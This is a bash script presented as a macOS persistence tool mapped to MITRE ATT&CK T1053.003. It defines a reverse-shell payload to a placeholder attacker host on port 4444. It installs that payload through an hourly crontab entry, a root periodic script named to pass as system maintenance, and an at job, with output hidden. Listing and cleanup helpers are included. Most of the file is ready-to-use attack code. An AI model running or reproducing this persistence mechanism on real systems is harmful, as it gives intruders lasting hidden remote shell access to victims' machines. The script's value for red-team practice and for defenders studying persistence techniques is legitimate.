#!/bin/bash
# macOS Cron/Periodic/At Persistence
# Usage: ./cron_persistence.sh <command> [options]
# MITRE ATT&CK: T1053.003 (Cron)

set -euo pipefail

PAYLOAD='bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'

usage() {
    cat << 'EOF'
Usage: ./cron_persistence.sh <command>

Commands:
  install-cron      Add user crontab entry (callback every hour)
  install-periodic  Add periodic daily/weekly/monthly script (requires root)
  install-at        Schedule an at job
  list              Show all scheduled tasks
  remove-cron       Remove cron persistence
  remove-periodic   Remove periodic persistence
EOF
    exit 1
}

# ── User Crontab ──

install_cron() {
    local cmd="${1:-$PAYLOAD}"

    echo "[*] Installing cron persistence..."

    # Backup existing crontab
    crontab -l > /tmp/cron_backup 2>/dev/null || true

    # Add hourly callback (runs at minute 0 of every hour)
    (crontab -l 2>/dev/null; echo "0 * * * * /bin/bash -c '$cmd' >/dev/null 2>&1") | sort -u | crontab -

    echo "[+] Cron entry added. Current crontab:"
    crontab -l

    echo ""
    echo "[*] Cron variants:"
    echo "  Every minute:    * * * * *"
    echo "  Every 5 min:     */5 * * * *"
    echo "  Every hour:      0 * * * *"
    echo "  Daily at 9 AM:   0 9 * * *"
    echo "  Mon-Fri at 8 AM: 0 8 * * 1-5"
    echo "  Weekly Sunday:   0 0 * * 0"
}

# ── Periodic Scripts ──

install_periodic() {
    local frequency="${1:-daily}"
    local script_name="500.system-maintenance"

    if [ "$(id -u)" -ne 0 ]; then
        echo "[!] Periodic scripts require root. Run with sudo."
        exit 1
    fi

    local script_path="/etc/periodic/${frequency}/${script_name}"

    echo "[*] Installing periodic $frequency script: $script_path"

    cat > "$script_path" << SCRIPT
#!/bin/sh
# System maintenance task
/bin/bash -c '${PAYLOAD}' >/dev/null 2>&1 &
exit 0
SCRIPT

    chmod 755 "$script_path"
    chown root:wheel "$script_path"

    echo "[+] Installed: $script_path"
    echo "[+] Periodic scripts are run by the system daily/weekly/monthly launchd job"
    echo ""
    echo "[*] When periodic scripts run:"
    echo "  daily:   Between 3:15 AM and 5:30 AM (or when mac wakes)"
    echo "  weekly:  Saturday between 3:15 AM and 5:30 AM"
    echo "  monthly: 1st of month between 5:30 AM and 6:30 AM"
    echo ""
    echo "[*] Force run: sudo periodic daily"
}

# ── At Jobs ──

install_at() {
    local delay="${1:-now + 1 hour}"

    echo "[*] Scheduling at job for: $delay"

    # macOS may have atrun disabled by default
    # Check if atrun LaunchDaemon is loaded
    if ! launchctl list 2>/dev/null | grep -q "com.apple.atrun"; then
        echo "[!] atrun is not loaded. Loading..."
        sudo launchctl load -w /System/Library/LaunchDaemons/com.apple.atrun.plist 2>/dev/null || echo "[!] Cannot load atrun"
    fi

    echo "/bin/bash -c '$PAYLOAD'" | at "$delay" 2>/dev/null

    echo "[+] At job scheduled"
    echo "[*] Pending at jobs:"
    atq 2>/dev/null || echo "  Cannot list"
}

# ── List All ──

list_tasks() {
    echo "═══ User Crontab ═══"
    crontab -l 2>/dev/null || echo "  No crontab"

    echo ""
    echo "═══ System Crontab ═══"
    cat /etc/crontab 2>/dev/null || echo "  No /etc/crontab"

    echo ""
    echo "═══ Periodic Scripts ═══"
    echo "Daily:"
    ls -la /etc/periodic/daily/ 2>/dev/null
    echo "Weekly:"
    ls -la /etc/periodic/weekly/ 2>/dev/null
    echo "Monthly:"
    ls -la /etc/periodic/monthly/ 2>/dev/null

    echo ""
    echo "═══ At Jobs ═══"
    atq 2>/dev/null || echo "  No at jobs or atrun disabled"

    echo ""
    echo "═══ Launchd Calendar Intervals ═══"
    echo "User agents with schedules:"
    grep -rl "StartCalendarInterval\|StartInterval" ~/Library/LaunchAgents/ 2>/dev/null || echo "  None"
}

# ── Cleanup ──

remove_cron() {
    echo "[*] Removing cron entries containing ATTACKER_IP..."
    crontab -l 2>/dev/null | grep -v "ATTACKER_IP" | crontab - 2>/dev/null
    echo "[+] Cleaned. Current crontab:"
    crontab -l 2>/dev/null || echo "  Empty"
}

remove_periodic() {
    echo "[*] Removing periodic scripts..."
    for freq in daily weekly monthly; do
        for script in /etc/periodic/${freq}/500.*; do
            if [ -f "$script" ]; then
                echo "  Removing: $script"
                sudo rm -f "$script"
            fi
        done
    done
    echo "[+] Done"
}

# ── Main ──
case "${1:-}" in
    install-cron)     install_cron "${2:-}";;
    install-periodic) install_periodic "${2:-daily}";;
    install-at)       install_at "${2:-now + 1 hour}";;
    list)             list_tasks;;
    remove-cron)      remove_cron;;
    remove-periodic)  remove_periodic;;
    *)                usage;;
esac
